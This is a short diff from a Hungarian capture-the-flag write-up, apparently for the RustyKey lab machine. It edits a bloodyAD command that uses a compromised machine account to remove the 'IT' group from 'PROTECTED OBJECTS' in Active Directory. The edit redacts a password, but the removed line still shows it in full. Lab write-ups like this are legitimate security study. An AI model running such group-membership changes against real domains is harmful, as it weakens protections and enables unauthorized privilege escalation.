@@ -108,7 +108,7 @@ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rus<pass>
 ## Protected Objects törlés
 
 ```bash
-bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'PROTECTED OBJECTS' 'IT'
+bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rus<pass>' -k remove groupMember 'PROTECTED OBJECTS' 'IT'
 [-] IT removed from PROTECTED OBJECTS
 ```
 
